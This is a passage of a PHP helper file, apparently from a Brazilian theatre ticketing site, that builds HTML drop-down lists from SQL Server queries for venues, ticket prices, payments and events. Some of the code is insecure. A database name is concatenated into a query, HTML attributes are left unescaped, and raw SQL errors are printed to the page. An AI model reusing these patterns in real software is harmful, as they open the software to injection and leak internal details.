    $result = executeSQL($mainConnection, $query);

    $combo = '<option value="">Selecione um estado...</option>';
    while ($rs = fetchResult($result)) {
	if (($selected == $rs['ID_ESTADO'])) {
	    $isSelected = 'selected';
	    $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]) . '</span>';
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_ESTADO'] . '"' . $isSelected . '>' . utf8_encode($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]) . '</option>';
    }
    if (sqlErrors ())
	return print_r(sqlErrors());
    else
	return $isCombo ? $combo : $text;
}

function comboMunicipio($name, $selected, $idEstado, $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_MUNICIPIO,DS_MUNICIPIO FROM MW_MUNICIPIO WHERE ID_ESTADO = ? ORDER BY DS_MUNICIPIO';
    $params = array($idEstado);
    $result = executeSQL($mainConnection, $query, $params);

    $combo = '<option value="">Selecione um município...</option>';
    while ($rs = fetchResult($result)) {
	if (($selected == $rs['ID_MUNICIPIO'])) {
	    $isSelected = 'selected';
	    $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode($rs["DS_MUNICIPIO"]) . '</span>';
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_MUNICIPIO'] . '"' . $isSelected . '>' . utf8_encode($rs["DS_MUNICIPIO"]) . '</option>';
    }
    if (sqlErrors ())
	return print_r(sqlErrors()) . print_r($params);
    else
	return $isCombo ? $combo : $text;
}

function comboTipoLocal($name, $selected, $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_TIPO_LOCAL, DS_TIPO_LOCAL FROM MW_TIPO_LOCAL';
    $result = executeSQL($mainConnection, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um tipo...</option>';
    while ($rs = fetchResult($result)) {
	if (($selected == $rs['ID_TIPO_LOCAL'])) {
	    $isSelected = 'selected';
	    $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode($rs["DS_TIPO_LOCAL"]) . '</span>';
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_TIPO_LOCAL'] . '"' . $isSelected . '>' . utf8_encode($rs["DS_TIPO_LOCAL"]) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboTipoLocalOptions($name, $selected, $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_TIPO_LOCAL, DS_TIPO_LOCAL FROM MW_TIPO_LOCAL';
    $result = executeSQL($mainConnection, $query);

    $combo = '<option value="">Selecione um tipo...</option>';
    while ($rs = fetchResult($result)) {
	if (($selected == $rs['ID_TIPO_LOCAL'])) {
	    $isSelected = 'selected';
	    $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode($rs["DS_TIPO_LOCAL"]) . '</span>';
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_TIPO_LOCAL'] . '"' . $isSelected . '>' . utf8_encode($rs["DS_TIPO_LOCAL"]) . '</option>';
    }

    return $isCombo ? $combo : $text;
}

function comboPrecosIngresso($name, $apresentacaoID, $idCadeira, $selected = NULL, $isCombo = true) {
    $mainConnection = mainConnection();

    $query = 'SELECT B.ID_BASE, E.ID_EVENTO
				 FROM
				 MW_BASE B
				 INNER JOIN MW_EVENTO E ON E.ID_BASE = B.ID_BASE
				 INNER JOIN MW_APRESENTACAO A ON A.ID_EVENTO = E.ID_EVENTO
				 WHERE A.ID_APRESENTACAO = ?';
    $params = array($apresentacaoID);
    $rs = executeSQL($mainConnection, $query, $params, true);

    $id_base = $rs['ID_BASE'];
    $conn = getConnection($rs['ID_BASE']);
    $id_evento = $rs['ID_EVENTO'];

    $query = "SELECT COUNT(1) AS MEIA_ESTUDANTE
				FROM TABTIPBILHETE B
				INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB ON AB.CODTIPBILHETE = B.CODTIPBILHETE
				INNER JOIN CI_MIDDLEWAY..MW_RESERVA R ON AB.ID_APRESENTACAO = R.ID_APRESENTACAO
				AND AB.ID_APRESENTACAO_BILHETE = R.ID_APRESENTACAO_BILHETE
				WHERE B.STATIPBILHMEIAESTUDANTE = 'S' AND B.STATIPBILHETE = 'A'
				AND R.ID_SESSION = ?";
    $rs2 = executeSQL($conn, $query, array(session_id()), true);

    $ocultarMeiaEstudante = (getTotalMeiaEntradaDisponivel($apresentacaoID) <= 0 and $rs2['MEIA_ESTUDANTE'] == 0) ? "AND (B.STATIPBILHMEIAESTUDANTE <> 'S' OR B.STATIPBILHMEIAESTUDANTE IS NULL) " : '';

    $query = "SELECT B.CODTIPBILHETE
				FROM TABTIPBILHETE B
				INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB ON AB.CODTIPBILHETE = B.CODTIPBILHETE
				INNER JOIN CI_MIDDLEWAY..MW_RESERVA R ON AB.ID_APRESENTACAO = R.ID_APRESENTACAO
				AND AB.ID_APRESENTACAO_BILHETE = R.ID_APRESENTACAO_BILHETE
				WHERE B.STATIPBILHMEIAESTUDANTE = 'N' AND B.STATIPBILHETE = 'A' AND B.QTDVENDAPORLOTE > 0
				AND R.ID_SESSION = ?";
    $result = executeSQL($conn, $query, array(session_id()));

    $bilhetes_lote_no_carrinho = array();
    while ($rs = fetchResult($result)) {
    	$bilhetes_lote_no_carrinho[] = $rs['CODTIPBILHETE'];
    }

    $ocultarLote = (getTotalLoteDisponivel($apresentacaoID) <= 0 and $rs2['LOTE'] == 0) ? true : false;

    $query = "SELECT	ID_APRESENTACAO_BILHETE,
					    AB.CODTIPBILHETE,
					    AB.DS_TIPO_BILHETE,
					    VL_LIQUIDO_INGRESSO,
					    CASE WHEN PC.CODTIPPROMOCAO = 4 THEN 1 ELSE 0 END AS IN_BIN,
					    ISNULL(CE.QT_PROMO_POR_CPF, ISNULL(PC.QT_PROMO_POR_CPF, 0)) AS QT_PROMO_POR_CPF,
					    B.STATIPBILHMEIAESTUDANTE,
					    B.QTDVENDAPORLOTE,
					    B.IMG1PROMOCAO,
					    B.IMG2PROMOCAO,
					    A.ID_EVENTO,
						B.ID_PROMOCAO_CONTROLE,
					    B.IN_HOT_SITE
				FROM
				 CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB 
				 INNER JOIN 
				 CI_MIDDLEWAY..MW_APRESENTACAO   A
				 ON A.ID_APRESENTACAO = AB.ID_APRESENTACAO
				 INNER JOIN 
				 CI_MIDDLEWAY..MW_EVENTO   E
				 ON E.ID_EVENTO = A.ID_EVENTO
				 INNER JOIN
				 TABTIPBILHETE B
				 ON	 B.CODTIPBILHETE = AB.CODTIPBILHETE
				 AND B.IN_VENDA_SITE = 1
				 AND 0 = CASE DATEPART(W, A.DT_APRESENTACAO)
							WHEN 1 THEN IN_DOM 
							WHEN 2 THEN IN_SEG 
							WHEN 3 THEN IN_TER 
							WHEN 4 THEN IN_QUA 
							WHEN 5 THEN IN_QUI 
							WHEN 6 THEN IN_SEX 
							ELSE IN_SAB
							END
				LEFT JOIN CI_MIDDLEWAY..MW_PROMOCAO_CONTROLE PC
				 ON PC.ID_PROMOCAO_CONTROLE = B.ID_PROMOCAO_CONTROLE
                LEFT JOIN CI_MIDDLEWAY..MW_CONTROLE_EVENTO CE
                 ON CE.ID_PROMOCAO_CONTROLE = PC.ID_PROMOCAO_CONTROLE
                 AND CE.ID_EVENTO = E.ID_EVENTO
				WHERE AB.ID_APRESENTACAO = ? 
				AND AB.IN_ATIVO = '1'
				AND NOT EXISTS (SELECT 1 FROM 
						TABAPRESENTACAO AP
						INNER JOIN
						TABRESTRICAOBILHETE R
						ON AP.CODPECA = R.CODPECA
						AND AP.CODSALA = R.CODSALA
						AND R.CODSETOR IS NULL
					 WHERE AB.CODTIPBILHETE = R.CODTIPBILHETE
					   AND AP.CODAPRESENTACAO = A.CODAPRESENTACAO)
				AND NOT EXISTS (SELECT 1 FROM 
						TABAPRESENTACAO AP
						INNER JOIN
						TABRESTRICAOBILHETE R
						ON AP.CODPECA = R.CODPECA
						AND AP.CODSALA = R.CODSALA
						INNER JOIN
						TABSALDETALHE D
						ON D.CODSALA = AP.CODSALA
						AND D.INDICE  = ?
						AND D.CODSETOR = R.CODSETOR
				WHERE AB.CODTIPBILHETE = R.CODTIPBILHETE
				   AND AP.CODAPRESENTACAO = A.CODAPRESENTACAO)
					$ocultarMeiaEstudante
				ORDER BY AB.DS_TIPO_BILHETE";
				
    $result = executeSQL($conn, $query, array($apresentacaoID, $idCadeira));

    $combo = '<select name="' . $name . '" class="' . $name . ' inputStyle">';
    $first_selected = false;

    while ($rs = fetchResult($result)) {

    	if (
    		(in_array($id_evento, explode(',', $_COOKIE['hotsite'])) and $rs['IN_HOT_SITE'] == '1')
    		or
    		(!in_array($id_evento, explode(',', $_COOKIE['hotsite'])) and $rs['IN_HOT_SITE'] != '1')
    		) {
    		// bilhetes que passarem na validacao serao exibidos
    	} else {
    		// ignorar bilhetes que sejam de hotsite durante o acesso normal
    		// ignorar bilhetes normais em eventos acessados via hotsite
    		continue;
    	}

    	$is_lote = $rs['QTDVENDAPORLOTE'] > 0 and $rs['STATIPBILHMEIAESTUDANTE'] == 'N';
    	$is_lote_disponivel = getTotalLoteDisponivel($rs['ID_APRESENTACAO_BILHETE']) > 0;
    	$is_lote_no_carrinho = in_array($rs['CODTIPBILHETE'], $bilhetes_lote_no_carrinho);

		// ignorar lote se nao estiver disponivel, desde que o cliente nao tenha o bilhete no carrinho
    	if (!$is_lote
    		or ($is_lote and $is_lote_disponivel)
    		or ($is_lote and $is_lote_no_carrinho)) {
			
			// se for bin itau
			if ($rs['IN_BIN']) {
				$rs['IMG1PROMOCAO'] = '../images/promocional/' . basename($rs['IMG1PROMOCAO']);
				$rs['IMG2PROMOCAO'] = '../images/promocional/' . basename($rs['IMG2PROMOCAO']);

				$BIN = 'qtBin="' . $rs['QT_PROMO_POR_CPF'] . '" codeBin="' . $rs['ID_PROMOCAO_CONTROLE'] .
						'" img1="' . $rs['IMG1PROMOCAO'] . '" img2="' . $rs['IMG2PROMOCAO'] . '" sizeBin="6"';
				$promocao = '';

			// se for codigo promocional
			} elseif ($rs['ID_PROMOCAO_CONTROLE'] != NULL) {
				$rs['IMG1PROMOCAO'] = '../images/promocional/' . basename($rs['IMG1PROMOCAO']);
				$rs['IMG2PROMOCAO'] = '../images/promocional/' . basename($rs['IMG2PROMOCAO']);

				$BIN = '';
				$promocao = 'qtPromocao="' . $rs['QT_PROMO_POR_CPF'] . '" codPromocao="'.$rs['ID_PROMOCAO_CONTROLE'] .
							'" img1="' . $rs['IMG1PROMOCAO'] . '" img2="' . $rs['IMG2PROMOCAO'] . '" sizeBin="32"';

			// nem bin itau e nem codigo promocional
			} else {
				$BIN = $promocao = '';
			}

			$meia_estudante = $rs['STATIPBILHMEIAESTUDANTE'] == 'S' ? ' meia_estudante="1"' : '';
			$lote = ($rs['QTDVENDAPORLOTE'] > 0 and $rs['STATIPBILHMEIAESTUDANTE'] == 'N') ? ' lote="1"' : '';

			if (($selected == $rs['ID_APRESENTACAO_BILHETE'])) {
			    $isSelected = 'selected';
			    $text = '<input type="hidden" name="' . $name . '" value="' . $rs['ID_APRESENTACAO_BILHETE'] . '" ' . $BIN . $promocao .
		    			' valor="'.number_format($rs['VL_LIQUIDO_INGRESSO'], 2, ',', '').'"><span class="' . $name . ' inputStyle">' . utf8_encode($rs['DS_TIPO_BILHETE']) . '</span>';
			} else {
			    $isSelected = '';
			}

			// seleciona o primeira ingresso nao promocional desde que o usuario nao tenha selecionado nada ainda
			if (empty($selected) and $BIN == $promocao and !$first_selected) {
				$isSelected = 'selected';
				$first_selected = true;
			}

			$combo .= '<option value="' . $rs['ID_APRESENTACAO_BILHETE'] . '" ' . $isSelected . ' ' . $BIN . $promocao . $meia_estudante . $lote .
					  ' valor="'.number_format($rs['VL_LIQUIDO_INGRESSO'], 2, ',', '').'">' . utf8_encode($rs['DS_TIPO_BILHETE']) . '</option>';
		}
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboTeatro($name, $selected, $funcJavascript = "") {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_BASE, DS_NOME_TEATRO FROM MW_BASE WHERE IN_ATIVO = \'1\' ORDER BY DS_NOME_TEATRO');

    $combo = '<select name="' . $name . '" ' . $funcJavascript . ' class="inputStyle" id="' . $name . '"><option value="">Selecione um local...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_BASE'] . '"' . (($selected == $rs['ID_BASE']) ? ' selected' : '') . '>' . utf8_encode($rs['DS_NOME_TEATRO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboSala($name, $teatroID) {
    $conn = getConnection($teatroID);
    $result = executeSQL($conn, 'SELECT CODSALA, NOMSALA FROM TABSALA WHERE STASALA = \'A\' AND INGRESSONUMERADO = \'1\'');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma sala...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['CODSALA'] . '">' . utf8_encode($rs['NOMSALA']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboMeioPagamento($name, $selected = '-1', $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_MEIO_PAGAMENTO, DS_MEIO_PAGAMENTO FROM MW_MEIO_PAGAMENTO ORDER BY DS_MEIO_PAGAMENTO ASC';
    $result = executeSQL($mainConnection, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um meio...</option>';
    while ($rs = fetchResult($result)) {
	if ($selected == $rs['ID_MEIO_PAGAMENTO']) {
	    $isSelected = 'selected';
	    $text = utf8_encode($rs['DS_MEIO_PAGAMENTO']);
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_MEIO_PAGAMENTO'] . '"' . $isSelected . '>' . utf8_encode($rs['DS_MEIO_PAGAMENTO']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboFormaPagamento($name, $teatroID, $selected = '-1', $isCombo = true) {
    $conn = getConnection($teatroID);
    $query = 'SELECT CODFORPAGTO, FORPAGTO FROM TABFORPAGAMENTO WHERE STAFORPAGTO = \'A\'';
    $result = executeSQL($conn, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma forma...</option>';
    while ($rs = fetchResult($result)) {
	if ($selected == $rs['CODFORPAGTO']) {
	    $isSelected = 'selected';
	    $text = utf8_encode($rs['FORPAGTO']);
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['CODFORPAGTO'] . '"' . $isSelected . '>' . utf8_encode($rs['FORPAGTO']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboBilhetes2($name, $teatroID, $selected = '-1', $isCombo = true) {
    $conn = getConnection($teatroID);
    $query = 'SELECT CODTIPBILHETE, DS_NOME_SITE FROM TABTIPBILHETE WHERE STATIPBILHETE = \'A\' AND IN_VENDA_SITE = 1 ORDER BY 2';
    $result = executeSQL($conn, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um bilhete...</option>';
    while ($rs = fetchResult($result)) {
	if ($selected == $rs['CODTIPBILHETE']) {
	    $isSelected = 'selected';
	    $text = utf8_encode($rs['DS_NOME_SITE']);
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['CODTIPBILHETE'] . '"' . $isSelected . '>' . utf8_encode($rs['DS_NOME_SITE']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

// Cria combo de situações
function comboSituacao($name, $situacao = null, $isCombo = true) {
    $dados = array("V" => "Escolha a opção...",
					"F" => "Finalizado",
					"P" => "Em Processamento",
					"C" => "Cancelado pelo Usuário",
					"E" => "Expirado",
					"S" => "Estornado");
    
	$combo = "<select name=\"" . $name . "\" id=\"" . $name . "\">";
	foreach ($dados as $key => $valor) {
	    if ($situacao == $key) {
			$selected = "selected=\"selecteded\"";
			$text = $valor;
	    } else {
			$selected = "";
		}
	    $combo .= "<option value=\"" . $key . "\"" . $selected . ">" . $valor . "</option>";
	}
	$combo .= "</select>";

    return $isCombo ? $combo : $text;
}

function comboFormaEntrega($forma = null) {
    $dados = array("R" => "E-ticket");

    foreach ($dados as $key => $valor) {
	if ($key == $forma) {
	    $return = $valor;
	}
    }

    return $return;
}

function comboLocal($name, $selected = '-1', $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_BASE, DS_NOME_TEATRO, DS_NOME_BASE_SQL FROM CI_MIDDLEWAY..MW_BASE WHERE IN_ATIVO = 1 ORDER BY 2';
    $result = executeSQL($mainConnection, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um tipo...</option>';
    while ($rs = fetchResult($result)) {
	if (($selected == $rs['ID_BASE'])) {
	    $isSelected = 'selected';
	    $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode($rs["DS_NOME_TEATRO"]) . '</span>';
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_BASE'] . '"' . $isSelected . '>' . utf8_encode($rs["DS_NOME_TEATRO"]) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboEventos($idBase, $nomeBase, $idUsuario) {
    $mainConnection = mainConnection();
    $tsql = "SELECT P.CODPECA, P.NOMPECA
			  FROM 
				  " . $nomeBase . "..TABPECA P
				  INNER JOIN 
				  CI_MIDDLEWAY..MW_ACESSO_CONCEDIDO A
				  ON	A.CODPECA = P.CODPECA
				  AND A.ID_BASE = ?
				  AND A.ID_USUARIO = ?
			  WHERE STAPECA = 'A' ORDER BY 2";
    $stmt = executeSQL($mainConnection, $tsql, array($idBase, $idUsuario));
    print("<option value=\"null\">Todos</option>");
    while ($eventos = fetchResult($stmt)) {
	print("<option value=\"" . $eventos["CODPECA"] . "\">" . utf8_encode($eventos["NOMPECA"]) . "</option>\n");
    }
}

function comboPatrocinador($name, $selected = '-1', $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_PATROCINADOR, DS_NOMPATROCINADOR FROM MW_PATROCINADOR ORDER BY DS_NOMPATROCINADOR ASC';
    $result = executeSQL($mainConnection, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um patrocinador...</option>';
    while ($rs = fetchResult($result)) {
	if ($selected == $rs['ID_PATROCINADOR']) {
	    $isSelected = 'selected';
	    $text = utf8_encode($rs['DS_NOMPATROCINADOR']);
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_PATROCINADOR'] . '"' . $isSelected . '>' . utf8_encode($rs['DS_NOMPATROCINADOR']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboCartaoPatrocinado($name, $idPatrocinador, $selected = '-1', $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_CARTAO_PATROCINADO, DS_CARTAO_PATROCINADO FROM MW_CARTAO_PATROCINADO WHERE ID_PATROCINADOR = ?';
    $result = executeSQL($mainConnection, $query, array($idPatrocinador));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um cart&atilde;o patrocinado...</option><option value="TODOS">&lt; TODOS &gt;</option>';
    while ($rs = fetchResult($result)) {
	if ($selected == $rs['ID_CARTAO_PATROCINADO']) {
	    $isSelected = 'selected';
	    $text = utf8_encode($rs['DS_CARTAO_PATROCINADO']);
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_CARTAO_PATROCINADO'] . '"' . $isSelected . '>' . utf8_encode($rs['DS_CARTAO_PATROCINADO']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboTabPeca($name, $conn, $selected = '-1', $isCombo = true) {
    $query = 'SELECT CODPECA, NOMPECA FROM TABPECA ORDER BY NOMPECA';
    $result = executeSQL($conn, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma pe&ccedil;a...</option>';
    while ($rs = fetchResult($result)) {
	if ($selected == $rs['CODPECA']) {
	    $isSelected = 'selected';
	    $text = utf8_encode($rs['NOMPECA']);
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['CODPECA'] . '"' . $isSelected . '>' . utf8_encode($rs['NOMPECA']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboEventosItau($name, $user, $selected = '-1') {
    $mainConnection = mainConnection();
    $query = 'SELECT E.ID_EVENTO, E.DS_EVENTO
				FROM MW_EVENTO E
				INNER JOIN MW_USUARIO_ITAU_EVENTO U ON E.ID_EVENTO = U.ID_EVENTO
				WHERE U.ID_USUARIO = ? AND E.IN_VENDE_ITAU = 1
				ORDER BY DS_EVENTO';
    $result = executeSQL($mainConnection, $query, array($user));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um evento...</option>';
    while ($rs = fetchResult($result)) {
	if ($selected == $rs['ID_EVENTO']) {
	    $isSelected = ' selected';
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_EVENTO'] . '"' . $isSelected . '>' . utf8_encode($rs['DS_EVENTO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboApresentacoesItau($name, $user, $evento, $selected = '-1') {
    $mainConnection = mainConnection();
    $query = "SELECT A.ID_APRESENTACAO, CONVERT(VARCHAR(10),
				DT_APRESENTACAO, 103) + ' - ' + A.HR_APRESENTACAO + ' || ' + DS_PISO DS_APRESENTACAO,
				A.DT_APRESENTACAO, A.HR_APRESENTACAO
				FROM MW_EVENTO E
				INNER JOIN MW_USUARIO_ITAU_EVENTO U ON E.ID_EVENTO = U.ID_EVENTO
				INNER JOIN MW_APRESENTACAO A ON A.ID_EVENTO = E.ID_EVENTO
				WHERE E.ID_EVENTO = ? AND E.IN_VENDE_ITAU = 1 AND U.ID_USUARIO = ? AND A.IN_ATIVO = 1
				AND CONVERT(VARCHAR(8), A.DT_APRESENTACAO,112) >= CONVERT(VARCHAR(8), GETDATE()-2, 112)
				ORDER BY DT_APRESENTACAO, HR_APRESENTACAO";
    $result = executeSQL($mainConnection, $query, array($evento, $user));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma apresenta&ccedil;&atilde;o...</option>';
    while ($rs = fetchResult($result)) {
	if ($selected == $rs['ID_APRESENTACAO']) {
	    $isSelected = ' selected';
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_APRESENTACAO'] . '"' . $isSelected . '>' . utf8_encode($rs['DS_APRESENTACAO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboEventoPorUsuario($name, $teatro, $usuario, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, "SELECT AC.CODPECA, E.DS_EVENTO
											FROM MW_EVENTO E
											INNER JOIN MW_ACESSO_CONCEDIDO AC ON E.ID_BASE = AC.ID_BASE
											AND AC.ID_USUARIO = ? AND AC.CODPECA = E.CODPECA
											WHERE E.ID_BASE = ?
											AND E.IN_ATIVO = '1'
											ORDER BY DS_EVENTO",
		    array($usuario, $teatro));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um evento...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['CODPECA'] . '"' .
		(($selected == $rs['CODPECA']) ? ' selected' : '') .
		'>' . str_replace("'", "\'", utf8_encode($rs['DS_EVENTO'])) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboTeatroPorUsuario($name, $usuario, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, "SELECT DISTINCT B.ID_BASE, B.DS_NOME_TEATRO
											FROM MW_BASE B
											INNER JOIN MW_ACESSO_CONCEDIDO AC ON B.ID_BASE = AC.ID_BASE
											AND AC.ID_USUARIO = ?
											WHERE IN_ATIVO = '1'
											ORDER BY DS_NOME_TEATRO",
		    array($usuario));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um local...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_BASE'] . '"' . (($selected == $rs['ID_BASE']) ? ' selected' : '') . '>' . utf8_encode($rs['DS_NOME_TEATRO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboDia($name, $selected, $shortText = false) {
    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">'.($shortText ? 'dia' : 'Selecione um dia...').'</option>';
    for ($i = 1; $i <= 31; $i++) {
	$combo .= '<option value="' . substr('0'.$i, -2) . '"' . (($selected == $i) ? ' selected' : '') . '>' . substr('0'.$i, -2) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboMeses($name, $selected, $number = false, $shortText = false) {
    $meses = array(
	'01' => 'Janeiro',
	'02' => 'Fevereiro',
	'03' => 'Março',
	'04' => 'Abril',
	'05' => 'Maio',
	'06' => 'Junho',
	'07' => 'Julho',
	'08' => 'Agosto',
	'09' => 'Setembro',
	'10' => 'Outubro',
	'11' => 'Novembro',
	'12' => 'Dezembro'
    );

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">'.($shortText ? 'm&ecirc;s' : 'Selecione um m&ecirc;s...').'</option>';
    foreach ($meses as $key => $val) {
	$combo .= '<option value="' . $key . '"' . (($selected == $key) ? ' selected' : '') . '>' . ($number ? $key : ($shortText ? strtolower(substr($val, 0, 3)) : $val)) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboAnos($name, $selected, $inicial = 0, $final = 0, $shortText = false) {
    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">'.($shortText ? 'ano' : 'Selecione um ano...').'</option>';
    for ($i = $inicial; $i <= $final; $i++) {
	$combo .= '<option value="' . $i . '"' . (($selected == $i) ? ' selected' : '') . '>' . $i . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboPaginas($name, $selected) {
    $conn = getConnectionDw();
    $result = executeSQL($conn, "SELECT ID_PAGINA, DS_PAGINA FROM DIM_PAGINA ORDER BY 2", array());

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma p&aacute;gina...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_PAGINA'] . '"' . (($selected == $rs['ID_PAGINA']) ? ' selected' : '') . '>' . utf8_encode($rs['DS_PAGINA']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboOrigemChamado($name, $selected) {
    $conn = getConnectionDw();
    $result = executeSQL($conn, "SELECT ID_ORIGEM_CHAMADO, DS_ORIGEM_CHAMADO FROM DIM_ORIGEM_CHAMADO ORDER BY 2", array());

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma origem...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_ORIGEM_CHAMADO'] . '"' . (($selected == $rs['ID_ORIGEM_CHAMADO']) ? ' selected' : '') . '>' . utf8_encode($rs['DS_ORIGEM_CHAMADO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboTipoChamado($name, $selected) {
    $conn = getConnectionDw();
    $result = executeSQL($conn, "SELECT ID_TIPO_CHAMADO, DS_TIPO_CHAMADO FROM DIM_TIPO_CHAMADO ORDER BY 2", array());

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um tipo...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_TIPO_CHAMADO'] . '"' . (($selected == $rs['ID_TIPO_CHAMADO']) ? ' selected' : '') . '>' . utf8_encode($rs['DS_TIPO_CHAMADO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboTipoResolucao($name, $selected) {
    $conn = getConnectionDw();
    $result = executeSQL($conn, "SELECT ID_TIPO_RESOLUCAO, DS_TIPO_RESOLUCAO FROM DIM_TIPO_RESOLUCAO ORDER BY 2", array());

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma resolução...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_TIPO_RESOLUCAO'] . '"' . (($selected == $rs['ID_TIPO_RESOLUCAO']) ? ' selected' : '') . '>' . utf8_encode($rs['DS_TIPO_RESOLUCAO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboAdmins($name, $selected = '-1', $isCombo = true) {
    $mainConnection = mainConnection();
	$result = executeSQL($mainConnection, 'SELECT ID_USUARIO, DS_NOME FROM  MW_USUARIO WHERE IN_ATIVO = 1 AND IN_ADMIN = 1 ORDER BY DS_NOME ASC');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um administrador...</option>';
    while ($rs = fetchResult($result)) {
	if ($selected == $rs['ID_USUARIO']) {
	    $isSelected = 'selected';
	    $text = $rs['DS_NOME'];
	} else {
	    $isSelected = '';
	}
	$combo .= '<option value="' . $rs['ID_USUARIO'] . '"' . $isSelected . '>' . addslashes($rs['DS_NOME']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboTipoLancamento($name, $teatro, $selected) {
    $conn = getConnection($teatro);
